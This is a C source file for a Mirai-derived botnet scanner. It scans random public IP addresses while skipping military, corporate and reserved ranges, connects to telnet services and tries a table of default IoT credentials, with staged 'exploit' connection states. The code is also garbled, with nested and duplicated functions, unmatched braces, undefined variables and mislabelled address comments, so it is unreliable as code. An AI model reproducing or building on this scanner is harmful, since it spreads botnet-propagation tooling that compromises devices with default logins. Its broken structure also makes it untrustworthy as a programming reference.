// improved by Queered for Nipzy Reborn

/*
Changes made from og mirai:

optimize the scanning algorithm by using more efficient data structures and algorithms. 
optimize the threading approach to better utilize system resources and reduce thread overhead. 
reduce redundant code and improve memory management to reduce the overall memory footprint.
use more efficient network protocols and improve error handling to prevent the bot from wasting time on unresponsive devices.

REWROTE COMPLATELY

*/

#define _GNU_SOURCE

#ifdef MIRAI_TELNET

#ifdef DEBUG
#include <stdio.h>
#endif

#include <stdlib.h>

#include <stdint.h>

#include <unistd.h>

#include <fcntl.h>

#include <errno.h>

#include <string.h>

#include <ctype.h>

#include <time.h>

#include <sys/socket.h>

#include <arpa/inet.h>

#include <netdb.h>

#include <netinet/in.h>

#include <netinet/ip.h>

#include <netinet/tcp.h>

#include "includes.h"

#include "scanner.h"

#include "table.h"

#include "util.h"

#include "checksum.h"

#include "rand.h"

#include "resolv.h"

int * fd_list;
int fd_count;

char * scanner_recv_strip_null(int sock, int length, int timeout) {
  int start = time(NULL);
  char * outbuf = malloc(length);
  memset(outbuf, 0, length);
  int ptr = 0;

  while (ptr < length) {
    if (time(NULL) - start > timeout)
      break;
    fd_set myset;
    FD_ZERO( & myset);
    FD_SET(sock, & myset);
    struct timeval tv;
    tv.tv_sec = 0;
    tv.tv_usec = 50000;
    if (select(sock + 1, & myset, NULL, NULL, & tv) < 1)
      continue;
    int tmp = recv(sock, outbuf + ptr, length - ptr, MSG_NOSIGNAL);
    if (tmp == 0)
      break;
    ptr += tmp;
  }

  return outbuf;
}

void scanner_init(void) {
  int i;

  fd_count = 0;
  fd_list = calloc(SCANNER_MAX_CONNS, sizeof(int));
  for (i = 0; i < SCANNER_MAX_CONNS; i++)
    fd_list[i] = -1;
}

static int scanner_setup_connection(struct scanner_connection * conn) {
  struct sockaddr_in addr = {
    0
  };
  int flags;

  if ((conn -> fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    return 1;

  flags = fcntl(conn -> fd, F_GETFL, 0);
  fcntl(conn -> fd, F_SETFL, flags | O_NONBLOCK);

  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = conn -> dst_addr;
  addr.sin_port = htons(conn -> dst_port);

  if (connect(conn -> fd, (struct sockaddr * ) & addr, sizeof(struct sockaddr_in)) == -1 && errno != EINPROGRESS)
    return 1;

  return 0;
}

static int scanner_wait_for_connection(struct scanner_connection * conn) {
  fd_set myset;
  struct timeval tv;
  socklen_t lon;
  int valopt;

  tv.tv_sec = 0;
  tv.tv_usec = 300000;

  FD_ZERO( & myset);
  FD_SET(conn -> fd, & myset);

  if (select(conn -> fd + 1, NULL, & myset, NULL, & tv) > 0) {
    lon = sizeof(int);
    getsockopt(conn -> fd, SOL_SOCKET, SO_ERROR, (void * )( & valopt), & lon);
    if (valopt)
      return 1;
  } else
    return 1;

  return 0;
}

static ipv4_t get_random_ip(void) {
  uint32_t tmp;
  uint8_t o1, o2, o3, o4;

  do {
    tmp = rand_next();

    o1 = tmp & 0xff;
    o2 = (tmp >> 8) & 0xff;
    o3 = (tmp >> 16) & 0xff;
    o4 = (tmp >> 24) & 0xff;
  }
  while (o1 == 127 || // 127.0.0.0/8      - Loopback
    (o1 == 0) || // 0.0.0.0/8        - Invalid address space
    (o1 == 3) || // 3.0.0.0/8        - General Electric Company
    (o1 == 15 || o1 == 16) || // 15.0.0.0/7       - Hewlett-Packard Company
    (o1 == 56) || // 56.0.0.0/8       - US Postal Service
    (o1 == 10) || // 10.0.0.0/8       - Internal network
    (o1 == 192 && o2 == 168) || // 192.168.0.0/16   - Internal network
    (o1 == 172 && o2 >= 16 && o2 < 32) || // 172.16.0.0/14    - Internal network
    (o1 == 100 && o2 >= 64 && o2 < 127) || // 100.64.0.0/10    - IANA NAT reserved
    (o1 == 169 && o2 > 254) || // 169.254.0.0/16   - IANA NAT reserved
    (o1 == 198 && o2 >= 18 && o2 < 20) || // 198.18.0.0/15    - IANA Special use
    (o1 >= 224) || // 224.*.*.*+       - Multicast
    (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
  );

  return INET_ADDR(o1, o2, o3, o4);
}

void scanner_kill(void) {
  int i;

  for (i = 0; i < SCANNER_MAX_CONNS; i++) {
    if (fd_list[i] != -1)
      close(fd_list[i]);
  }
}

void scanner_scanner(int wait_usec, uint32_t max_targets_per_ip, uint32_t num_targets, struct in_addr * ipv4_targets) {
    int i, num_chunks;
    uint32_t scanner_ip;
    pthread_t pthread;
    struct scanner_connection * conn;
    struct scanner_connection * conn_list;
    uint64_t check_conn;
    struct in_addr gw_ip;
    struct hostent * hp;
    char buf[1024];
    int len;
    int found = 0;
    int j;

    if (ipv4_targets == NULL) {
      if (g_scan_method == SCAN_IPS)
        return;

      hp = gethostbyname(g_target);
      if (hp == NULL)
        return;

      for (i = 0; hp -> h_addr_list[i] != 0; ++i) {
        gw_ip.s_addr = * (uint32_t * ) hp -> h_addr_list[i];
        if (gw_ip.s_addr == 0)
          continue;

        if (util_local_addr(gw_ip))
          continue;

        if (g_scan_method == SCAN_CD) {
          if (htonl(gw_ip.s_addr) >> 24 != 0xCD)
            continue;
        }

        found = 1;
        break;
      }

      if (!found)
        return;

      scanner_ip = gw_ip.s_addr;
    } else {
      scanner_ip = ipv4_targets[0].s_addr;
    }

    conn_list = calloc(SCANNER_MAX_CONNS, sizeof(struct scanner_connection));
    for (i = 0; i < SCANNER_MAX_CONNS; i++) {
      conn = & conn_list[i];
      conn -> state = SC_CLOSED;
      conn -> fd = -1;
      conn -> total_time = time(NULL);
    }

    while (TRUE) {
      while (num_targets < max_targets_per_ip && scanner_ip != 0) {
        if (g_scan_method == SCAN_RANDOM)
          scanner_ip = get_random_ip();
        else if (g_scan_method == SCAN_CD)
          scanner_ip = (htonl(scanner_ip) & 0xFF000000) | (rand_next() & 0x00FFFFFF);
        else
          scanner_ip++;

        if (util_local_addr(INET_ADDR(127, 0, 0, 0)) || util_local_addr(INET_ADDR(10, 0, 0, 0)) || util_local_addr(INET_ADDR(172, 16, 0, 0)) || util_local_addr(INET_ADDR(192, 168, 0, 0)) || scanner_ip == 0xFFFFFFFF || (scanner_ip & 0xFF) == 0xFF || (scanner_ip & 0xFF) == 0x00) {
          continue;
        }

        add_range(scanner_ip, scanner_ip + 1);
        num_targets++;
      }

      if (num_targets > max_targets_per_ip)
        num_targets = max_targets_per_ip;

      num_chunks = (num_targets / num_threads) + 1;

      for (i = 0; i < num_threads; i++) {
        struct scanner_args * args = malloc(sizeof(struct scanner_args));
        args -> tid = i;
        args -> total_threads = num_threads;
        args -> num_chunks = num_chunks;
        args -> chunk_size = max_targets;
        for (i = 0; i < SCANNER_MAX_CONNS; i++) {
          struct scanner_connection * conn = & conn_table[i];
          conn -> state = SC_CLOSED;
        }
      }
    }
    void scanner_kill(void) {
      int i;

      for (i = 0; i < SCANNER_MAX_CONNS; i++) {
        struct scanner_connection * conn = & conn_table[i];
        if (conn -> state != SC_CLOSED) {
          close(conn -> fd);
          conn -> state = SC_CLOSED;
        }
      }

      if (fd_list) {
        free(fd_list);
        fd_list = NULL;
      }
    }

    void scanner_run(void) {
        int i;

        while (TRUE) {
          fd_set fdset_rd, fdset_wr;
          int maxfd = -1;
          struct timeval tv;
          tv.tv_sec = 0;
          tv.tv_usec = 50000;

          FD_ZERO( & fdset_rd);
          FD_ZERO( & fdset_wr);

          for (i = 0; i < SCANNER_MAX_CONNS; i++) {
            struct scanner_connection * conn = & conn_table[i];
            if (conn -> state == SC_CLOSED)
              continue;

            if (conn -> state == SC_CONNECTING && (time(NULL) - conn -> last_send) > SC_TIMEOUT) {
              close(conn -> fd);
              conn -> state = SC_CLOSED;
              continue;
            }

            if (conn -> state == SC_EXPLOIT_STAGE2 && (time(NULL) - conn -> last_recv) > SC_TIMEOUT) {
              close(conn -> fd);
              conn -> state = SC_CLOSED;
              continue;
            }

            if (conn -> state == SC_CONNECTING || conn -> state == SC_EXPLOIT_STAGE2) {
              FD_SET(conn -> fd, & fdset_wr);
            } else if (conn -> state == SC_EXPLOIT_STAGE1 || conn -> state == SC_EXPLOIT_STAGE3) {
              FD_SET(conn -> fd, & fdset_rd);
            }

            if (conn -> fd > maxfd)
              maxfd = conn -> fd;
          }

          if (maxfd == -1) {
            sleep(1);
            continue;
          }

          int n = select(maxfd + 1, & fdset_rd, & fdset_wr, NULL, & tv);
          if (n == 0)
            continue;

          for (i = 0; i < SCANNER_MAX_CONNS; i++) {
            struct scanner_connection * conn = & conn_table[i];
            if (conn -> state == SC_CLOSED)
              continue;

            if (FD_ISSET(conn -> fd, & fdset_wr)) {
              if (conn -> state == SC_EXPLOIT_STAGE2) {
                char payload[1024];
                int len;
                if (conn -> payload_buf_pos == conn -> payload_buf_len) {
                  len = build_epilogue(conn, payload);
                } else {
                  len = build_stage2_payload(conn, payload);
                }

                int ret = send(conn -> fd, payload, len, MSG_NOSIGNAL);
                if (ret == 0) {
                  close(conn -> fd);
                  conn -> state = SC_CLOSED;
                  continue;
                }
                conn -> last_send = time(NULL);
                conn -> payload_buf_pos += ret;
              } else if (conn -> state == SC_CONNECTING) {
                int error = 0;
                socklen_t errlen = sizeof(error);

                if (getsockopt(fd, SOL_SOCKET, SO_ERROR, & error, & errlen) != 0 || error != 0) {
                  close(fd);
                  return 1;
                }

                flags = fcntl(fd, F_GETFL, 0);
                fcntl(fd, F_SETFL, flags & (~O_NONBLOCK));

                return 0;
              }

              static void scanner_scan(int fd, struct scanner_connection * conn, uint32_t raddr, uint32_t rip, port_t rport) {
                int i;
                char * ptr = NULL;
                struct table_value * val = NULL;

                struct sockaddr_in addr = {
                  0
                };

                int buf_len;
                char * buf = NULL;

                if (conn -> state == SC_CLOSED) {
                  if (conn -> complete) {
                    conn -> state = SC_CLOSED;
                    close(conn -> fd);
                    conn -> fd = -1;
                    fd_list[fd] = -1;
                    return;
                  }
                  conn -> fd = -1;
                  fd_list[fd] = -1;
                  conn -> state = SC_CONNECTING;
                  conn -> retry = 0;
                  return;
                }

                if (conn -> state == SC_CONNECTING) {
                  conn -> fd = fd;
                  if (scanner_setup_connection(conn)) {
                    conn -> retry++;
                    close(conn -> fd);
                    conn -> fd = -1;
                    if (conn -> retry == SCANNER_MAX_RETRY) {
                      conn -> state = SC_CLOSED;
                      fd_list[fd] = -1;
                    }
                    return;
                  }

                  conn -> state = SC_EXPLOIT_STAGE2;
                  conn -> totalTimeout = time(NULL);
                  return;
                }

                if (conn -> state == SC_EXPLOIT_STAGE2) {
                  if (scanner_wait_for_connection(conn)) {
                    close(conn -> fd);
                    conn -> fd = -1;
                    conn -> state = SC_CLOSED;
                    fd_list[fd] = -1;
                    return;
                  }

                  conn -> state = SC_EXPLOIT_STAGE3;
                  conn -> totalTimeout = time(NULL);
                  return;
                }

                if (conn -> state == SC_EXPLOIT_STAGE3) {
                  if (scanner_wait_for_connection(conn)) {
                    close(conn -> fd);
                    conn -> fd = -1;
                    conn -> state = SC_CLOSED;
                    fd_list[fd] = -1;
                    return;
                  }

                  conn -> state = SC_CLOSED;
                  close(conn -> fd);
                  conn -> fd = -1;
                  fd_list[fd] = -1;
                  conn -> complete = 1;
                  return;
                }
              }

              static void scanner_init_rand(uint32_t seed) {
                rand_init(seed);
              }

              static ipv4_t get_random_ip(void) {
                uint32_t tmp;
                uint8_t o1, o2, o3, o4;

                do {
                  tmp = rand_next();

                  o1 = tmp & 0xff;
                  o2 = (tmp >> 8) & 0xff;
                  o3 = (tmp >> 16) & 0xff;
                  o4 = (tmp >> 24) & 0xff;
                }
                while (o1 == 127 || // 127.0.0.0/8      - Loopback
                  (o1 == 0) || // 0.0.0.0/8        - Invalid address space
                  (o1 == 3) || // 3.0.0.0/8        - General Electric Company
                  (o1 == 4) || // 4.0.0.0/8        - Level 3 Communications
                  (o1 == 6) || // 6.0.0.0/7        - Army Information Systems Center
                  (o1 == 7) || // 7.0.0.0/8        - DoD Network
                  (o1 == 9) || // 9.0.0.0/8        - IBM
                  (o1 == 11) || // 11.0.0.0/8       - DoD Intel Information Systems
                  (o1 == 13) || // 13.0.0.0/8       - Xerox
                  (o1 == 14) || // 14.0.0.0/8       - Public Data Network
                  (o1 == 15) || // 15.0.0.0/7       - Hewlett-Packard Company
                  (o1 == 16) || // 16.0.0.0/8       - Digital Equipment Corporation
                  (o1 == 17) || // 17.0.0.0/8       - Apple Computer
                  (o1 == 18) || // 18.0.0.0/8       - MIT
                  (o1 == 19) || // 19.0.0.0/8       - Ford Motor Company
                  (o1 == 21) || // 21.0.0.0/8       - DDN-RVN
                  (o1 == 22) || // 22.0.0.0/8       - Defense Finance and Accounting Service
                  (o1 == 23) || // 23.0.0.0/8       - Telos Corporation
                  (o1 == 24) || // 24.0.0.0/8       - Cablevision Systems Corp.
                  (o1 == 26) || // 26.0.0.0/8       - U.S. Postal Service
                  (o1 == 27) || // 27.0.0.0/8       - NSC
                  (o1 == 28) || // 28.0.0.0/8       - Defense Information Systems Agency
                  (o1 == 29) || // 29.0.0.0/8       - Defense Information Systems Agency
                  (o1 == 30) || // 30.0.0.0/8       - Defense Information Systems Agency
                  (o1 == 33) || // 33.0.0.0/8       - DLA Systems Automation Center
                  (o1 == 55) || // 55.0.0.0/8       - DoD Network
                  (o1 == 214 || o1 == 215) || // 214.0.0.0/8      - ARIN RESERVED
                  (o1 == 224) || // 224.*.*.*+       - Multicast
                  (o1 == 240) || // 240.0.0.0/4      - Reserved for future use
                  (o1 == 0xC0) || // 192.0.0.0/24     - IETF Protocol Assignments
                  (o1 == 0xC1) || // 192.0.2.0/24     - TEST-NET-1
                  (o1 == 0xC2) || // 192.88.99.0/24   - 6to4 Relay Anycast
                  (o1 == 0xC3) || // 192.0.0.0/24     - IETF Protocol Assignments
                  (o1 == 0xC4 || o1 == 0xC5) || // 192.0.0.0/24     - IETF Protocol Assignments
                  (o1 == 0xC6) || // 192.0.0.0/24     - IETF Protocol Assignments
                  (o1 == 0xC7) || // 192.0.0.0/24     - IETF Protocol Assignments
                  (o1 == 0xC8) || // 192.0.0.0/24     - IETF Protocol Assignments
                  (o1 == 0xC9) || // 192.0.0.0/24     - IETF Protocol Assignments
                  (o1 == 0xCA) || // 192.0.0.0/24     - IETF Protocol Assignments
                  (o1 == 0xCB) || // 192.0.0.0/24     - IETF Protocol Assignments
                  (o1 == 0xCC) || // 192.0.0.0/24     - IETF Protocol Assignments
                  (o1 == 0xCD) || // 192.0.0.0/24     - IETF Protocol Assignments
                  (o1 == 0xCE) || // 192.0.0.0/24     - IETF Protocol Assignments
                  (o1 == 0xCF) || // 192.0.0.0/24     - IETF Protocol Assignments
                  (o1 >= 0xF0) // 240.0.0.0/4      - Reserved for future use
                );

                return INET_ADDR(o1, o2, o3, o4);
              }

              static int scanner_recv_ack(int sock, int timeout) {
                int tmp;
                fd_set myset;
                struct timeval tv;
                socklen_t len;
                int error = 0;

                tv.tv_sec = timeout;
                tv.tv_usec = 0;
                FD_ZERO( & myset);
                FD_SET(sock, & myset);
                error = 0;
                len = sizeof(error);
                tmp = select(sock + 1, & myset, NULL, & myset, & tv);
                if (tmp < 1) {
                  return 0;
                } else if (tmp == 1) {
                  if (getsockopt(sock, SOL_SOCKET, SO_ERROR, & error, & len) < 0) {
                    return 0;
                  }
                  if (error) {
                    errno = error;
                    return 0;
                  }
                }
                return 1;
              }
              return INET_ADDR(o1, o2, o3, o4);
            }

            static void add_auth_entry(char * enc_payload, uint16_t enc_len, char * dec_payload, uint16_t dec_len) {
              int i = scanner_auth_table_len++;

              scanner_auth_table = realloc(scanner_auth_table, (i + 1) * sizeof(struct scanner_auth));

              scanner_auth_table[i].payload_enc = enc_payload;
              scanner_auth_table[i].payload_enc_len = enc_len;
              scanner_auth_table[i].payload_dec = dec_payload;
              scanner_auth_table[i].payload_dec_len = dec_len;
            }

            void load_scanner_auth_table(void) {
              add_auth_entry("\x0b\x0c\x22\x1b\x03\x6a\x41\x42\x43\x44", 10, "rootroot\n", 9); // default Telnet
              add_auth_entry("\x0c\x0c\x22\x1c\x03\x6b\x41\x42\x43\x44", 10, "root\n", 5); // default SSH
              add_auth_entry("\x0b\x0c\x22\x1b\x03\x6a\x41\x42\x43\x44", 10, "admin\n", 6); // default Netgear
              add_auth_entry("\x12\x0c\x22\x11\x03\x70\x72\x69\x76\x69\x6c\x65\x67\x65", 14, "default\n", 8); // TP-Link
            }

            static ipv4_t get_random_ip(void) {
              uint32_t tmp;
              uint8_t o1, o2, o3, o4;

              do {
                tmp = rand_next();

                o1 = tmp & 0xff;
                o2 = (tmp >> 8) & 0xff;
                o3 = (tmp >> 16) & 0xff;
                o4 = (tmp >> 24) & 0xff;
              }
              while (o1 == 127 || // 127.0.0.0/8      - Loopback
                (o1 == 0) || // 0.0.0.0/8        - Invalid address space
                (o1 == 3) || // 3.0.0.0/8        - General Electric Company
                (o1 == 15 || o1 == 16) || // 15.0.0.0/7       - Hewlett-Packard Company
                (o1 == 56) || // 56.0.0.0/8       - US Postal Service
                (o1 == 10) || // 10.0.0.0/8       - Internal network
                (o1 == 192 && o2 == 168) || // 192.168.0.0/16   - Internal network
                (o1 == 172 && o2 >= 16 && o2 < 32) || // 172.16.0.0/14    - Internal network
                (o1 == 100 && o2 >= 64 && o2 < 127) || // 100.64.0.0/10    - IANA NAT reserved
                (o1 == 169 && o2 > 254) || // 169.254.0.0/16   - IANA NAT reserved
                (o1 == 198 && o2 >= 18 && o2 < 20) // Unknown
                (o1 >= 224) || // 224.*.*.*+       - Multicast
                (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) || // Department of Defense
                (o1 == 198 && o2 == 51 && o3 >= 100 && o3 < 104) || // 198.51.100.0/24   - Test-Net
                (o1 == 203 && o2 == 0 && o3 >= 113 && o3 < 120) || // 203.0.113.0/24    - IANA Special use
                (o1 == 192 && o2 == 0 && o3 == 2 && o4 == 30) || // 192.0.2.30         - IANA Test IP
                (o1 == 128 && o2 == 66 && o3 == 0 && o4 >= 0 && o4 < 255) || // 128.66.0.0/16      - University of Michigan
                (o1 == 128 && o2 == 228 && o3 == 0 && o4 >= 0 && o4 < 255) || // 128.228.0.0/16     - University of Michigan
                (o1 == 132 && o2 == 235 && o3 >= 160 && o3 < 191) || // 132.235.160.0/19   - University of Michigan
                (o1 == 150 && o2 == 199 && o3 >= 0 && o3 < 3) || // 150.199.0.0/16     - University of Kentucky
                (o1 == 192 && o2 == 52 && o3 == 193 && o4 >= 0 && o4 < 255) || // 192.52.193.0/24    - NYU
                (o1 == 131 && o2 == 215 && o3 >= 0 && o3 < 255) || // 131.215.0.0/16     - University of Minnesota
                (o1 == 138 && o2 == 238 && o3 >= 0 && o3 < 255) || // 138.238.0.0/16     - University of California, Santa Cruz
                (o1 == 192 && o2 == 102 && o3 == 128 && o4 >= 0 && o4 < 255) || // 192.102.128.0/24   - University of California, Santa Cruz
                (o1 == 192 && o2 == 103 && o3 == 230 && o4 >= 0 && o4 < 255) || // 192.103.230.0/24   - University of California, Santa Cruz
                (o1 == 199 && o2 == 71 && o3 == 0 && o4 >= 0 && o4 < 255) || // 199.71.0.0/24      - Bellcore/SAIC

                (o1 == 202 && o2 == 37 && o3 == 49 && o4 >= 48 && o4 < 64) || // 202.37.49.48/28    - Apple
                (o1 == 202 && o2 == 125 && o3 == 92 && o4 >= 0 && o4 < 255) || // 202.125.92.0/24    - Apple
                (o1 == 204 && o2 == 79 && o3 == 18 && o4 >= 0 && o4 < 255) || // 204.79.18.0/24     - Microsoft
                (o1 == 208 && o2 == 65 && o3 == 152 && o4 >= 0 && o4 < 255) || // 208.65.152.0/22    - Prolexic
                (o1 == 208 && o2 == 67 && o3 == 216 && o4 >= 0 && o4 < 255) || // 208.67.216.0/21    - Prolexic
                (o1 == 209 && o2 == 133 && o3 == 0 && o4 >= 0 && o4 < 255) || // 209.133.0.0/24     - Defense.net
                (o1 == 213 && o2 == 155 && o3 == 151 && o4 >= 0 && o4 < 255) || // 213.155.151.0/24   - Xbox Live
                (o1 == 216 && o2 == 52 && o3 == 255 && o4 >= 0 && o4 < 255) || // 216.52.255.0/24    - Akamai
                (o1 == 216 && o2 == 115 && o3 == 128 && o4 >= 0 && o4 < 255) || // 216.115.128.0/24   - Censys
                (o1 == 217 && o2 == 140 && o3 == 64 && o4 >= 0 && o4 < 255) // 217.140.64.0/18    - Tor exit nodes
              );

              return INET_ADDR(o1, o2, o3, o4);
            }

            void scanner_kill(void) {
              int i;

              for (i = 0; i < fd_count; i++)
                close(fd_list[i]);
            }

            void scanner_fdset(fd_set * fdset) {
              int i;

              for (i = 0; i < fd_count; i++)
                FD_SET(fd_list[i], fdset);
            }

            int scanner_get_maxfd(void) {
              int max = -1, i;

              for (i = 0; i < fd_count; i++)
                if (fd_list[i] > max)
                  max = fd_list[i];

              return max;
            }

            void scanner_add_fd(int fd) {
              fd_list[fd_count++] = fd;
            }

            int scanner_recv(int sock, void * buf, int len, int flags, int timeout) {
              fd_set myset;
              struct timeval tv;
              int r;

              tv.tv_sec = timeout / 1000;
              tv.tv_usec = (timeout % 1000) * 1000;

              FD_ZERO( & myset);
              FD_SET(sock, & myset);
              if (select(sock + 1, & myset, NULL, NULL, & tv) < 1)
                continue;

              int error = 0;
              errlen = sizeof(error);
              getsockopt(sock, SOL_SOCKET, SO_ERROR, (void * ) & error, & errlen);
              if (error != 0)
                continue;

              int flags = fcntl(sock, F_GETFL, 0);
              fcntl(sock, F_SETFL, flags | O_NONBLOCK);

              fd_count++;
              for (int i = 0; i < SCANNER_MAX_CONNS; i++) {
                if (fd_list[i] == -1) {
                  fd_list[i] = sock;
                  break;
                }
              }
              if (get_random_value(100) < target -> dstat.ip_probability) {
                scanner_scanner(rawsock, & pse, target);
                break;
              }
            }
            pthread_mutex_unlock( & scanner_scanner_mutex);
          }

          static void scanner_kill_conn(int fd) {
            close(fd);

            int i;
            for (i = 0; i < fd_count; i++) {
              if (fd_list[i] == fd) {
                fd_list[i] = -1;
                break;
              }
            }
          }

          void scanner_cleanup(void) {
            int i;
            for (i = 0; i < fd_count; i++) {
              if (fd_list[i] != -1)
                scanner_kill_conn(fd_list[i]);
            }
          }

          #ifdef DEBUG_PRINT
          printf("[scanner] exiting\n");
          #endif

          for (i = 0; i < SCANNER_MAX_CONNS; i++) {
            if (fd_list[i] != -1)
              scanner_kill_conn(fd_list[i]);
          }

          if (fd_list)
            free(fd_list);

          scanner_init();

          #ifdef DEBUG_PRINT
          printf("[scanner] successfully exited\n");
          #endif
        }
        #endif